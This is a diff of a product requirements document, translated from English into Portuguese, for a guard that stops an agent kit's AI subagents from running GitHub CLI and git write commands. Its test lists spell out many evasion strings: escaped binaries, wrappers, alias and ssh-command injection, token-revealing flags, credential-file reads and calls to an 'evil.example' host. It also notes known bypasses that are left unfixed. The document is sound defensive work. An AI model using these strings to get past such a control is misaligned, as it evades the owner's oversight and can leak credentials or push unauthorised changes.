-- R10 Release manager text. `.agents/release-manager.md`, in "Stop when" (the sentence "This role performs no remote action"), says: the role runs the remote actions (push, PR, merge, tag) only with explicit owner authorization, and it never receives the title, the body or the comments of a third-party PR. The proof case of that file stays consistent. A dispatch rule in `.commands/*.md`, `.agents/coordinator.md` or `.skills/*/SKILL.md` that sends PR text to an agent names `qa-verifier`; none names `release-manager`. Verifiable: `grep -n 'performs no remote action' .agents/release-manager.md` finds nothing; the new text is present; `grep -rn -i 'release-manager' .commands .agents/coordinator.md` shows no dispatch of PR text to it.
-- R11 opencode recipe. These files show the measured form: `cd <clone> && <opencode binary> run --auto -m <provider/model>[#<variant>] --file=<prompt file> -- "Follow the attached prompt."`. The files are `.skills/external-clis/references/opencode.md` (both recipes, the flag table: `--dir` and `--variant` removed, the `#variant` rule added), `references/clone-isolation.md` (section 3, near line 138), `references/live-tree-freeze.md` (Order step 4, near line 44), and `SKILL.md` (the binary table row near line 241 and the "Who runs the call" paragraph near line 39). Each file states that this form starts with `cd`, does not match a `Bash(opencode:*)` allow rule, and may need the owner's approval for the Bash call. Verifiable: `grep -rn -e '--dir' -e '--variant' .skills/external-clis` finds no `opencode` hit; the measured form appears in `opencode.md`.
-- R12 Second named exception. The rule "every call is one command that starts with the binary" (`SKILL.md`, "Who runs the call", and the matching text in `references/clone-isolation.md` and `references/live-tree-freeze.md`) names two exceptions: `claude` and `opencode`. Both use `cd "$CLONE" && <binary> ...`. `grok` and `mcode` keep their own working-directory flag. Verifiable: `grep -n 'only allowed' .skills/external-clis/SKILL.md .skills/external-clis/references/*.md` finds no sentence that names only `claude`. PRD-025 R18 is history and stays unchanged.
-- R13 Self-match gotcha. `.skills/external-clis/references/gotchas.md` has a new entry: `pgrep -f` or `pkill -f` with a pattern that contains the delegate's own command or path matches the delegate's shell (exit 144, endless waits, seen 2026-10-21); do this instead: kill by the pid recorded when the call started, or use a bracket pattern (for example `'[o]pencode run'`). The entry holds no machine path and no project name (the file's own rule). Verifiable: the entry exists with both parts.
-- R14 Kill recipes. `references/live-tree-freeze.md` (near line 52), `references/clone-isolation.md` (near line 256) and `references/agy.md` (near line 27) no longer use `pkill -f -- "<clone path>"` or `pkill -f -- "<prompt basename>"`. Each kills by the recorded pid, or by a bracket pattern. The text says where the pid comes from (the call runs in the background and the Bash tool returns its pid; or the delegate reads it with `pgrep` before the call and after it, and kills the new one). Verifiable: `grep -rn 'pkill -f' .skills/external-clis` finds only the bracket-pattern form or the gotcha entry that warns against the plain form.
-- R15 Cleanup. Every stale reference that this change creates is removed (AGENTS.md, "Premissa de limpeza"): sentences that say "no remote action" for `release-manager`; sentences that say "prose only" for the `gh` ban (`.commands/review.md`, `.skills/code-review/SKILL.md`, `.agents/qa-verifier.md`, `docs/tutorial.html`, `docs/en/tutorial.html`) now say that the mod denies it in Claude Code and the prose stays as the second layer; sentences in the tutorials about the mod guard that list only the memory files and `Agent`. The ticket author runs each grep and lists the hits and the action taken. Verifiable: the ticket report lists the greps and the hits.
-- R16 Counts. The counts stay at 13 agents and 19 commands + 1 mod command, and 14 templates. No new agent, skill, command or template. Verifiable: `go run ./cmd/dh validate .` passes; `git diff --name-status main...HEAD -- .agents .skills .commands templates` lists no added or deleted file.
-- R17 Release and generated files. Release 0.32.1 in three places: `defaultVersion` in `internal/build/build.go` (now `0.32.0`), `version` in `.claude-plugin/marketplace.json`, and the source `ref` (`v0.32.1`). `CHANGELOG.md` has the 0.32.1 entry. `docs/roadmap.html` and `docs/en/roadmap.html` have a Delivered card for 0.32.1, and `dh validate` finds no drift against `CHANGELOG.md`. The tutorials (`docs/tutorial.html`, `docs/en/tutorial.html`) describe the `gh` guard where they describe the mod guard. `dist/` is regenerated by `go run ./cmd/dh build`, never by hand; a second build changes nothing except `generated_at`. `go run ./cmd/dh validate .` passes, `go test ./...` is green, and `claude plugin test` has 0 fail. Clean-clone proof applies (AGENTS.md, "Prova de clone limpo"), because the PR touches `internal/build/build.go` and `dist/*/bin`: `git clone . <tmp>`, `go run ./cmd/dh build` there, and `sha256sum` of the 5 binaries equals the tree. Verifiable: run the commands and compare with `git diff`.
-- R18 Merge stop. The PR touches `adapters/claude-code/plugin/hooks/**` and `.skills/external-clis/**`, both critical paths in `REVIEW.md`. The flow stops before the merge and asks the owner for an ok, even with a green gate and an approved QA verdict (PRD-026 R12). Verifiable: the QA report lists the matched critical paths.
-- R19 No private path in the PRD, the tickets or any new text. Use `<harness dir>` and `<home>`. Verifiable: `go run ./cmd/dh validate .` (`checkPrivatePaths`) passes.
+- R1 Função pura. Um arquivo novo em `adapters/claude-code/plugin/hooks/lib/` (proposta: `gh-guard.ts`) exporta uma função pura. Sua entrada é uma string de comando. Sua saída é o comando negado (uma string como `gh pr merge`, `gh secret set` ou `git push`) ou `undefined`. Não lê arquivo e não roda processo. Verificável: o arquivo existe, não importa nada que faça E/S, e os testes unitários de R2 a chamam diretamente.
+- R2 Testes unitários. Um arquivo de teste cobre os casos abaixo. Verificável: os testes passam na execução de testes TypeScript do repositório (o comando `claude plugin test` ou o script de teste dos hooks que o `panel.test.ts` já usa).
+  - Negados (um comando é retornado): `gh pr merge 1 --squash`; `gh pr merge --help`; `cd x && git push`; `GH_TOKEN=t gh pr comment 1 -b hi`; `gh api -X POST repos/o/r/issues/1/comments`; `gh api repos/o/r/issues/1/comments -f body=hi`; `gh api repos/o/r/pulls/1 -iXPUT`; `gh api repos/o/r/pulls/1 --method PUT`; `gh api -iXPOST repos/o/r/issues/1/comments`; `gh api -pfbody=hi repos/o/r/issues/1/comments`; `gh api -H "X-HTTP-Method-Override: PUT" repos/o/r/pulls/1/merge`.
+  - Negados, conjunto de regressão das rodadas de revisão: `git status; gh pr merge 1`; `echo "$(true; gh pr merge 1)"`; `echo "$(git -c 'user.name=a;b' push)"`; `git -c 'user.name=a;b' push`; `echo $'it\'s'; gh pr merge 1`; `g\it push`; `\git push`; `git` e `push` separados por uma continuação de linha; `sudo -u x gh pr merge 1`; `env -u VAR gh pr merge 1`; `env -u git gh pr merge 1`; `env -u git git push`; um caso para cada um dos wrappers `timeout`, `nohup`, `nice`, `time`, `xargs`, `stdbuf` e `setsid`; um caso para cada um de `{`, `!`, `then`, `do` e `else` antes do binário; `>/dev/null gh pr merge 1`; `<(gh pr merge 1)` e `>(gh pr merge 1)`; `gh.exe pr merge 1`; `git.exe push`; `bash -c "git push"`; `git push>out.txt`; `gh pr merge>out.txt`; `find . -exec git push \;`; `find . -execdir gh pr merge 1 {} +`; `watch -n 1 git push`; `script -qc "git push" /dev/null`; `parallel git push ::: a`; `flock /tmp/l git push`; `chronic git push`; `ssh host git push`; `git send-pack`; `git subtree push --prefix d origin main`; `git p4 submit`; `git svn dcommit`; `git -c alias.p=push p`; `git config --global alias.p push && git p`; `gh alias set x y`; `gh auth status -t`; `gh auth status --show-token`; `gh api repos/o/r --jq -R --method=DELETE`; `gh api repos/o/r --repo --method=DELETE`; `gh api repos/o/r --jq`; `gh auth status --show-token=true`; `gh auth status -t=true`; `gh auth status -at`; `git -c core.sshCommand='gh pr merge 1 #' fetch`; `git --upload-pack='gh pr merge 1 #' fetch x`; `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0=push git p`; `$(git --exec-path)/git-push`; `echo gh`; `grep -n 'gh;' README.md`; `git log --grep=push`; `npm run x-gh`; uma chamada de PowerShell com `g`, um acento grave, depois `h pr merge 1`; uma chamada de PowerShell `gh pr view 1` (sem exceção no PowerShell); `rg --pre 'git push' x .`; `ag --pager 'gh pr merge 1' x`; `echo 'a && git push'`.
+  - Negados, um caso para cada outra família do `gh`: `gh issue close`, `gh release create`, `gh repo delete`, `gh auth token`, `gh workflow run`, `gh api --method DELETE`, `gh api --input x`, `gh secret set`, `gh secret delete`, `gh variable set`, `gh label create`, `gh run rerun`, `gh run cancel`, `gh run delete`, `gh workflow enable`, `gh workflow disable`, `gh gist create`, `gh pr update-branch`, `gh pr lock`, `gh cache delete`, `gh repo deploy-key add`, `gh release delete-asset`.
+  - Negados, novos com a regra curta: `ls ~/.config/gh`; `cat ~/.config/gh/hosts.yml`; `$(echo gh) pr merge 1`; `gh pr view 1 --jq '.x'` (um falso positivo aceito).
+  - Negados, novos com a emenda 6: a chamada de PowerShell `<drive>:\Program Files\GitHub CLI\gh.exe pr merge 1`; `GH pr merge 1`; `Git push`; `git-lfs push origin main`; `gh api --hostname evil.example repos/o/r`; `gh api https://evil.example/x`; `GH pr view 1` (um falso positivo aceito).
+  - Permitidos (`undefined`): `gh pr view 1 --json title`; `gh pr diff 1`; `gh api repos/o/r/pulls/1`; `gh api repos/o/r/pulls/1 --jq .title`; `gh pr view 1 -R o/r`; `gh -R o/r pr view 1`; `gh auth status -h github.com`; `gh auth status --active`; `ghq list`; `grep -rn "git push" docs/`; `grep -rn "gh pr view" .commands`; `git log --oneline`; `git status && git diff`; `git -c 'user.name=a;b' status`; `env -u git git status`; `gh pr checks 1 --watch`; `gh run watch 123`; `git fetch origin`; `gh pr view 45 --json state,mergedAt`; `gh run list --limit 3`; `go test ./... 2>&1 | tail -n 20`; `sha256sum $(git ls-files -m)`; `git log --format='%h (%s)' -n 3`; `npm run gh-pages`; `gh auth status`; `gh --version`; `echo "$(git -c 'user.name=a;b' status)"`; `gh api -i repos/o/r/pulls/1`; um caso para cada outra leitura de 2.2.
+  - Negados, novos com a emenda 7: ``echo `g\\it push` ``; ``echo `g\\h pr merge 1` ``; `g\\it push`.
+  - Permitidos, casos de regressão da emenda 6: `gh pr view 1`; `gh api repos/o/r --jq .name`; `gh auth status -h github.com`; `git log`; `ls gh-pages`.
+- R3 Ligação. A trava roda dentro do caminho `tool.call` já existente do `panel.ts`, por `guardBash` (ou uma função que ele chama). A mesma checagem roda na ferramenta `Bash` e em toda outra ferramenta que recebe um comando de shell (`Monitor`, `PowerShell`), no campo de comando, por esse caminho do mod. Sem entrada nova no `hooks.json`, sem hook `command`, sem módulo novo. Verificável: `git diff main...HEAD -- adapters/claude-code/plugin/hooks/hooks.json` fica vazio; o `panel.ts` chama a função de R1 para cada uma dessas ferramentas.
+- R4 Mapa de subagentes. O `panel.ts` registra `agentId` para `subagentType` quando `agent.spawn` retorna um `agentId`, no mesmo lugar que chama `recordSpawn`. A trava lê o mapa pelo `agentId` da chamada de Bash. Verificável: um teste do engine cria um subagente do tipo `dh:qa-verifier` e depois envia uma chamada de Bash com esse `agentId`.
+- R5 Escopo da negação. Em um teste do engine (a configuração do `panel.engine.test.ts`): (a) uma chamada de Bash com `agentId` do tipo `dh:qa-verifier` e um comando negado retorna `deny`; (b) o mesmo comando com `agentId` do tipo `dh:release-manager` não é negado pela trava; (c) o mesmo comando sem `agentId` (sessão principal) não é negado pela trava; (d) o mesmo comando com `agentId` de um tipo com outro prefixo (por exemplo `vault-agent`) não é negado pela trava; (e) uma chamada de Bash com um `agentId` que o mapa não conhece e um comando negado retorna `deny` com um motivo que nomeia a causa; (f) um subagente do kit com um comando permitido (`gh pr view 1`) não é negado; (g) uma chamada de `Monitor` com `agentId` do tipo `dh:qa-verifier` e um comando negado retorna `deny`, e a mesma chamada de `Monitor` sem `agentId` não é negada pela trava; (h) uma chamada de `PowerShell` com `agentId` do tipo `dh:qa-verifier` e sem `command` do tipo string retorna `deny` com o verbo `unreadable command`, e uma chamada de `Monitor` sem `command` não é negada. Verificável: os oito testes passam. "Não negado pela trava" significa que o resultado é o mesmo de antes deste PRD para essa chamada.
+- R6 Mensagem de negação. O motivo (a) nomeia o verbo casado, (b) diz que só o `release-manager` ou a sessão principal pode rodá-lo, (c) diz para não tentar de novo e não contornar, e (d) diz: `For a text search, use the Grep tool.` O motivo de um `agentId` desconhecido (R5 e) também nomeia essa causa. A mensagem é em inglês e usa a tabela de idiomas do projeto se o `panel.ts` já tiver uma para outras mensagens da trava; se tiver, os dois idiomas trazem as quatro partes. Verificável: um teste afirma as quatro partes no motivo; nenhum caminho privado aparece nele.
+- R7 Falha aberta em erro da trava, falha fechada em tipo desconhecido. Uma exceção dentro da função da trava não nega a chamada (o `.catch(() => undefined)` já existente no caminho do Bash continua). Um `agentId` desconhecido com um comando que 2.3 nega é negado (R5 e). Verificável: um teste lança uma exceção dentro da trava e a chamada passa; R5 e passa.
+- R8 Medição M1 (autorizada pelo dono, rodada pelo `qa-verifier` no QA depois do build). Uma sessão real `claude -p --plugin-dir <built plugin dir>` no modo de permissão `bypass`. Dentro dela, um subagente `dh:qa-verifier` roda `gh pr merge --help`, e um subagente `dh:release-manager` roda `gh pr merge --help`. Passa: a primeira chamada é negada pelo mod com a mensagem de R6; a segunda imprime o texto de ajuda. A evidência é a saída da sessão, guardada em `.harness/tasks/<id>/evidence/`. Isso prova que a chamada de Bash de um subagente chega ao mod com seu `agentId` e que a negação vale no modo `bypass`. Se M1 falhar, este PRD entrega a trava só depois que o dono decidir; as outras regras (R9 a R14) não são bloqueadas por M1. Verificável: o arquivo de evidência traz as duas saídas; a matriz de QA lista M1 como passou, falhou ou `not-run`.
+- R9 Emenda do ADR. `docs/adr/ADR-005-trava-de-runtime-por-mod.md` tem uma emenda datada de 2026-10-21. Ela declara: (a) uma exceção estreita à frase "travar `Bash` por análise de comando" na seção 2, limitada aos comandos que a regra de 2.3 nega (`gh` fora da lista de leituras de 2.2, e `git` com uma palavra de escrita), nas chamadas de Bash, Monitor e PowerShell de subagentes do kit; (b) os contornos aceitos de 2.4; (c) o número do PRD. O campo de cabeçalho "Alterado por" lista o PRD-027. O texto do ADR fica em pt-br como o resto desse arquivo. Verificável: `grep -n 'PRD-027' docs/adr/ADR-005-trava-de-runtime-por-mod.md` acha o cabeçalho e a emenda; a emenda nomeia todos os contornos de 2.4.
+- R10 Texto do release manager. `.agents/release-manager.md`, em `Stop when` (a frase `This role performs no remote action`), diz: o papel roda as ações remotas (push, PR, merge, tag) só com autorização explícita do dono, e nunca recebe o título, o corpo nem os comentários de um PR de terceiros. O caso de prova desse arquivo continua consistente. Uma regra de despacho em `.commands/*.md`, `.agents/coordinator.md` ou `.skills/*/SKILL.md` que envia texto de PR a um agente nomeia `qa-verifier`; nenhuma nomeia `release-manager`. Verificável: `grep -n 'performs no remote action' .agents/release-manager.md` não acha nada; o texto novo está presente; `grep -rn -i 'release-manager' .commands .agents/coordinator.md` não mostra nenhum despacho de texto de PR para ele.
+- R11 Receita do opencode. Estes arquivos mostram a forma medida: `cd <clone> && <opencode binary> run --auto -m <provider/model>[#<variant>] --file=<prompt file> -- "Follow the attached prompt."`. Os arquivos são `.skills/external-clis/references/opencode.md` (as duas receitas, a tabela de flags: `--dir` e `--variant` removidos, a regra de `#variant` acrescentada), `references/clone-isolation.md` (seção 3, perto da linha 138), `references/live-tree-freeze.md` (passo 4 de `Order`, perto da linha 44) e `SKILL.md` (a linha da tabela de binários perto da linha 241 e o parágrafo `Who runs the call` perto da linha 39). Cada arquivo declara que essa forma começa com `cd`, não casa com uma regra de permissão `Bash(opencode:*)`, e pode precisar da aprovação do dono para a chamada de Bash. Verificável: `grep -rn -e '--dir' -e '--variant' .skills/external-clis` não acha nenhuma ocorrência de `opencode`; a forma medida aparece em `opencode.md`.
+- R12 Segunda exceção nomeada. A regra "toda chamada é um comando que começa com o binário" (`SKILL.md`, `Who runs the call`, e o texto correspondente em `references/clone-isolation.md` e `references/live-tree-freeze.md`) nomeia duas exceções: `claude` e `opencode`. Ambas usam `cd "$CLONE" && <binary> ...`. `grok` e `mcode` mantêm sua própria flag de diretório de trabalho. Verificável: `grep -n 'only allowed' .skills/external-clis/SKILL.md .skills/external-clis/references/*.md` não acha nenhuma frase que nomeie só o `claude`. O R18 do PRD-025 é história e continua inalterado.
+- R13 Pegadinha do auto-casamento. `.skills/external-clis/references/gotchas.md` tem uma entrada nova: `pgrep -f` ou `pkill -f` com um padrão que contém o comando ou o caminho do próprio delegado casa com o shell do delegado (saída 144, esperas infinitas, visto em 2026-10-21); faça isto no lugar: mate pelo pid registrado quando a chamada começou, ou use um padrão com colchetes (por exemplo `'[o]pencode run'`). A entrada não traz caminho de máquina nem nome de projeto (a regra do próprio arquivo). Verificável: a entrada existe com as duas partes.
+- R14 Receitas de kill. `references/live-tree-freeze.md` (perto da linha 52), `references/clone-isolation.md` (perto da linha 256) e `references/agy.md` (perto da linha 27) não usam mais `pkill -f -- "<clone path>"` nem `pkill -f -- "<prompt basename>"`. Cada uma mata pelo pid registrado, ou por um padrão com colchetes. O texto diz de onde vem o pid (a chamada roda em segundo plano e a ferramenta Bash retorna seu pid; ou o delegado o lê com `pgrep` antes da chamada e depois dela, e mata o novo). Verificável: `grep -rn 'pkill -f' .skills/external-clis` acha só a forma com padrão de colchetes ou a entrada da pegadinha que avisa contra a forma simples.
+- R15 Limpeza. Toda referência obsoleta que esta mudança cria é removida (AGENTS.md, "Premissa de limpeza"): frases que dizem "nenhuma ação remota" para o `release-manager`; frases que dizem "só prosa" para a proibição do `gh` (`.commands/review.md`, `.skills/code-review/SKILL.md`, `.agents/qa-verifier.md`, `docs/tutorial.html`, `docs/en/tutorial.html`) agora dizem que o mod a nega no Claude Code e que a prosa continua como segunda camada; frases nos tutoriais sobre a trava do mod que listam só os arquivos de memória e o `Agent`. O autor do ticket roda cada grep e lista as ocorrências e a ação tomada. Verificável: o relatório do ticket lista os greps e as ocorrências.
+- R16 Contagens. As contagens continuam em 13 agentes e 19 comandos + 1 comando do mod, e 14 templates. Nenhum agente, skill, comando ou template novo. Verificável: `go run ./cmd/dh validate .` passa; `git diff --name-status main...HEAD -- .agents .skills .commands templates` não lista nenhum arquivo adicionado ou removido.
+- R17 Release e arquivos gerados. Release 0.32.1 em três lugares: `defaultVersion` em `internal/build/build.go` (hoje `0.32.0`), `version` em `.claude-plugin/marketplace.json`, e o `ref` da fonte (`v0.32.1`). O `CHANGELOG.md` tem a entrada da 0.32.1. `docs/roadmap.html` e `docs/en/roadmap.html` têm um card `Delivered` para a 0.32.1, e o `dh validate` não acha deriva em relação ao `CHANGELOG.md`. Os tutoriais (`docs/tutorial.html`, `docs/en/tutorial.html`) descrevem a trava do `gh` onde descrevem a trava do mod. O `dist/` é regenerado por `go run ./cmd/dh build`, nunca à mão; um segundo build não muda nada além de `generated_at`. `go run ./cmd/dh validate .` passa, `go test ./...` fica verde, e `claude plugin test` tem 0 falhas. A prova de clone limpo se aplica (AGENTS.md, "Prova de clone limpo"), porque o PR toca `internal/build/build.go` e `dist/*/bin`: `git clone . <tmp>`, `go run ./cmd/dh build` lá, e o `sha256sum` dos 5 binários é igual ao da árvore. Verificável: rode os comandos e compare com `git diff`.
+- R18 Parada antes do merge. O PR toca `adapters/claude-code/plugin/hooks/**` e `.skills/external-clis/**`, ambos caminhos críticos no `REVIEW.md`. O fluxo para antes do merge e pede o ok do dono, mesmo com gate verde e veredito de QA aprovado (PRD-026 R12). Verificável: o relatório de QA lista os caminhos críticos casados.
+- R19 Nenhum caminho privado no PRD, nos tickets nem em qualquer texto novo. Use `<harness dir>` e `<home>`. Verificável: `go run ./cmd/dh validate .` (`checkPrivatePaths`) passa.
 
 ## 4. Docs
 
-Update:
+Atualize:
 
-- `adapters/claude-code/plugin/hooks/lib/` (new file, R1), its test file (R2), `adapters/claude-code/plugin/hooks/panel.ts` (R3, R4, R6, R7), `adapters/claude-code/plugin/hooks/panel.engine.test.ts` (R5, R6, R7).
+- `adapters/claude-code/plugin/hooks/lib/` (arquivo novo, R1), seu arquivo de teste (R2), `adapters/claude-code/plugin/hooks/panel.ts` (R3, R4, R6, R7), `adapters/claude-code/plugin/hooks/panel.engine.test.ts` (R5, R6, R7).
 - `docs/adr/ADR-005-trava-de-runtime-por-mod.md` (R9).
-- `.agents/release-manager.md` (R10); any dispatch text found by the R10 grep.
-- `.skills/external-clis/SKILL.md`, `references/opencode.md`, `references/clone-isolation.md`, `references/live-tree-freeze.md`, `references/agy.md`, `references/gotchas.md` (R11 to R14).
-- `.commands/review.md`, `.skills/code-review/SKILL.md`, `.agents/qa-verifier.md`: only where the "prose only" wording of the `gh` ban needs the mod note (R15).
+- `.agents/release-manager.md` (R10); qualquer texto de despacho achado pelo grep de R10.
+- `.skills/external-clis/SKILL.md`, `references/opencode.md`, `references/clone-isolation.md`, `references/live-tree-freeze.md`, `references/agy.md`, `references/gotchas.md` (R11 a R14).
+- `.commands/review.md`, `.skills/code-review/SKILL.md`, `.agents/qa-verifier.md`: só onde a redação "só prosa" da proibição do `gh` precisa da nota do mod (R15).
 - `docs/tutorial.html`, `docs/en/tutorial.html` (R15, R17), `docs/roadmap.html`, `docs/en/roadmap.html`, `CHANGELOG.md` (R17).
-- `internal/build/build.go` (version), `.claude-plugin/marketplace.json` (R17).
-- `AGENTS.md` already holds the line "Trava de `gh`" (added by the Coordinator on 2026-10-21). The ticket author reads it and reports any disagreement; it does not edit it.
+- `internal/build/build.go` (versão), `.claude-plugin/marketplace.json` (R17).
+- O `AGENTS.md` já tem a linha "Trava de `gh`" (acrescentada pelo Coordenador em 2026-10-21). O autor do ticket a lê e reporta qualquer discordância; não a edita.
 
-No `pdocs` exist for this project.
+Não existem `pdocs` para este projeto.
 
-Not affected (the ticket author checks with `grep`): `docs/plano-produto.html`; `docs/prd/PRD-025-coordinator-orchestrates.md` (R18 there is history); `README.md` and `README.en.md` unless a sentence becomes false.
+Não afetados (o autor do ticket checa com `grep`): `docs/plano-produto.html`; `docs/prd/PRD-025-coordinator-orchestrates.md` (o R18 ali é história); `README.md` e `README.en.md`, a menos que uma frase passe a ser falsa.
 
-## 5. Out of scope
+## 5. Fora do escopo
 
-- An OS sandbox.
-- Blocking `curl` or MCP GitHub tools.
-- Restricting the `qa-verifier` tool list.
-- A `dh review run` subcommand.
-- New eval cases or probes beyond M1 and M2.
-- Changes to the `reviewers:` configuration.
-- A guard in a runtime other than Claude Code (there the prose stays).
-- A fix for the known bypasses of 2.4.
+- Um sandbox de SO.
+- Bloquear `curl` ou as ferramentas MCP do GitHub.
+- Restringir a lista de ferramentas do `qa-verifier`.
+- Um subcomando `dh review run`.
+- Casos de avaliação ou sondas novos além de M1 e M2.
+- Mudanças na configuração `reviewers:`.
+- Uma trava em um runtime diferente do Claude Code (lá a prosa continua).
+- Uma correção dos contornos conhecidos de 2.4.
 
-## 6. Owner decisions
+## 6. Decisões do dono
 
-All taken on 2026-10-21.
+Todas tomadas em 2026-10-21.
 
-- D1 Scope: the mod denies the commands of 2.2 in shell-command calls (Bash, `Monitor`, `PowerShell`; R3) of kit subagents (`dh:` prefix) except `dh:release-manager`. An `agentId` whose type is not in the map is denied (fail closed), with a reason that names the cause. The main session and non-kit subagents are not affected (R4, R5, R7).
-- D2 Deny rule: for kit subagents in scope (D1), a command is triggered when it has a word `gh`, or a word `git` with a write word (`push`, `send-pack`, `subtree`, `p4`, `svn`, `dcommit`, `alias`). A `git-<name>` binary counts as the word `git`. A triggered command is denied, except a `gh` read from the list of 2.2 and a plain grep. Neither exception applies in PowerShell (2.3; R1, R2).
-- D3 Matching: a short rule, not a parser. In Bash the guard builds two trigger texts from the command in lower case, and either one triggers (2.3 point 1): text A without quotes and backslashes, text B with each `\\` pair mapped to `/` and then without quotes and the remaining backslashes. In PowerShell there is one text: `\` becomes `/` and quotes and backticks are removed. A "word" starts at the start or after any character that is not a letter, a digit or `_`. The word `git` ends before `.exe` or before a character that is not a letter, a digit or `_`, so it ends before `-`. The word `gh` and a write word also keep `-` inside the word. In PowerShell no exception applies. A `gh` read is allowed only when the raw command uses a small safe character set. A plain grep (first word `grep`, `egrep` or `fgrep`, no `;`, `|`, `&`, `$`, `(`, `)`, `<`, `>`, backtick or newline) is allowed. There is no splitting, no recursion and no length limit. The false positives of 2.3 are accepted (R1, R2).
-- D4 Deny message: matched verb, who may run it, no retry and no workaround (R6).
-- D5 Known bypasses: stated here and in the ADR amendment, not fixed (R9; section 2.4).
-- D6 Pure function in `hooks/lib/`, unit tests for every example of R2, wired into the existing `tool.call` path by `guardBash` for `Bash`, `Monitor` and `PowerShell`, no hook command (R1, R2, R3).
-- D7 ADR-005 section 2 amendment, narrow exception, dated 2026-10-21, with D5 (R9).
-- D8 `release-manager` text corrected; PR text goes to `qa-verifier` only (R10).
-- D9 Measurement M1 by `qa-verifier` in QA; if it fails, the guard ships only after the owner decides (R8).
-- D10 opencode recipe per M2; opencode is the second named exception (R11, R12).
-- D11 Self-match gotcha and kill by pid or bracket pattern (R13, R14).
-- D12 Version 0.32.1, CHANGELOG, roadmap pt/en, tutorial, counts unchanged, clean-clone proof, stop before merge (R15 to R19).
+- D1 Escopo: o mod nega os comandos de 2.2 em chamadas de comando de shell (Bash, `Monitor`, `PowerShell`; R3) de subagentes do kit (prefixo `dh:`), exceto `dh:release-manager`. Um `agentId` cujo tipo não está no mapa é negado (falha fechada), com um motivo que nomeia a causa. A sessão principal e os subagentes que não são do kit não são afetados (R4, R5, R7).
+- D2 Regra de negação: para subagentes do kit no escopo (D1), um comando é disparado quando tem uma palavra `gh`, ou uma palavra `git` com uma palavra de escrita (`push`, `send-pack`, `subtree`, `p4`, `svn`, `dcommit`, `alias`). Um binário `git-<name>` conta como a palavra `git`. Um comando disparado é negado, exceto uma leitura do `gh` da lista de 2.2 e um grep simples. Nenhuma das exceções se aplica no PowerShell (2.3; R1, R2).
+- D3 Casamento: uma regra curta, não um analisador. No Bash a trava monta dois textos de disparo a partir do comando em minúsculas, e qualquer um dispara (2.3 ponto 1): o texto A sem aspas e sem barras invertidas, o texto B com cada par `\\` mapeado para `/` e depois sem aspas e sem as barras invertidas restantes. No PowerShell há um texto só: `\` vira `/` e aspas e acentos graves são removidos. Uma "palavra" começa no início ou depois de qualquer caractere que não seja letra, dígito ou `_`. A palavra `git` termina antes de `.exe` ou antes de um caractere que não seja letra, dígito ou `_`, então termina antes de `-`. A palavra `gh` e uma palavra de escrita também mantêm o `-` dentro da palavra. No PowerShell nenhuma exceção se aplica. Uma leitura do `gh` só é permitida quando o comando bruto usa um conjunto pequeno de caracteres seguros. Um grep simples (primeira palavra `grep`, `egrep` ou `fgrep`, sem `;`, `|`, `&`, `$`, `(`, `)`, `<`, `>`, acento grave nem nova linha) é permitido. Não há divisão, recursão nem limite de tamanho. Os falsos positivos de 2.3 são aceitos (R1, R2).
+- D4 Mensagem de negação: verbo casado, quem pode rodá-lo, sem nova tentativa e sem contorno (R6).
+- D5 Contornos conhecidos: declarados aqui e na emenda do ADR, não corrigidos (R9; seção 2.4).
+- D6 Função pura em `hooks/lib/`, testes unitários para cada exemplo de R2, ligada ao caminho `tool.call` já existente por `guardBash` para `Bash`, `Monitor` e `PowerShell`, sem hook `command` (R1, R2, R3).
+- D7 Emenda da seção 2 do ADR-005, exceção estreita, datada de 2026-10-21, com D5 (R9).
+- D8 Texto do `release-manager` corrigido; o texto de PR vai só ao `qa-verifier` (R10).
+- D9 Medição M1 pelo `qa-verifier` no QA; se falhar, a trava só é entregue depois que o dono decidir (R8).
+- D10 Receita do opencode conforme M2; o opencode é a segunda exceção nomeada (R11, R12).
+- D11 Pegadinha do auto-casamento e kill por pid ou padrão com colchetes (R13, R14).
+- D12 Versão 0.32.1, CHANGELOG, roadmap pt/en, tutorial, contagens inalteradas, prova de clone limpo, parada antes do merge (R15 a R19).
 
-## Appendix
+## Apêndice
 
-### Suggested tickets
+### Tickets sugeridos
 
-| Ticket | Lane | Executor | Write set |
+| Ticket | `lane` | Executor | Conjunto de escrita |
 |---|---|---|---|
-| T-2701 | `backend` | `builder` (TypeScript) | `adapters/claude-code/plugin/hooks/lib/` (new guard file and its test), `adapters/claude-code/plugin/hooks/panel.ts`, `adapters/claude-code/plugin/hooks/panel.engine.test.ts`. Rules R1 to R7 |
-| T-2702 | `backend` (kit source) | `harness-maintainer` with `harness-authoring` | `.skills/external-clis/**`, `.agents/release-manager.md`, `.commands/review.md`, `.skills/code-review/SKILL.md`, `.agents/qa-verifier.md` (only where R15 hits), `docs/adr/ADR-005-trava-de-runtime-por-mod.md`. Rules R9 to R14, part of R15 |
-| T-2703 | `backend` (Go and docs) | `builder` (Go), then `docs-guide` | `internal/build/build.go`, `.claude-plugin/marketplace.json`, `CHANGELOG.md`, `docs/tutorial.html`, `docs/en/tutorial.html`, `docs/roadmap.html`, `docs/en/roadmap.html`. Rules R15 (docs part), R17 |
-| T-2704 | `teste (unitário e integração)` | `qa-verifier` | Runs M1 (R8), the greps of R10 to R16, R19, the clean-clone proof (R17) and the critical-path match (R18). No production code |
+| T-2701 | `backend` | `builder` (TypeScript) | `adapters/claude-code/plugin/hooks/lib/` (arquivo novo da trava e seu teste), `adapters/claude-code/plugin/hooks/panel.ts`, `adapters/claude-code/plugin/hooks/panel.engine.test.ts`. Regras R1 a R7 |
+| T-2702 | `backend` (fonte do kit) | `harness-maintainer` com `harness-authoring` | `.skills/external-clis/**`, `.agents/release-manager.md`, `.commands/review.md`, `.skills/code-review/SKILL.md`, `.agents/qa-verifier.md` (só onde o R15 achar ocorrências), `docs/adr/ADR-005-trava-de-runtime-por-mod.md`. Regras R9 a R14, parte do R15 |
+| T-2703 | `backend` (Go e docs) | `builder` (Go), depois `docs-guide` | `internal/build/build.go`, `.claude-plugin/marketplace.json`, `CHANGELOG.md`, `docs/tutorial.html`, `docs/en/tutorial.html`, `docs/roadmap.html`, `docs/en/roadmap.html`. Regras R15 (parte de docs), R17 |
+| T-2704 | `teste (unitário e integração)` | `qa-verifier` | Roda M1 (R8), os greps de R10 a R16, R19, a prova de clone limpo (R17) e o casamento de caminhos críticos (R18). Nenhum código de produção |
 
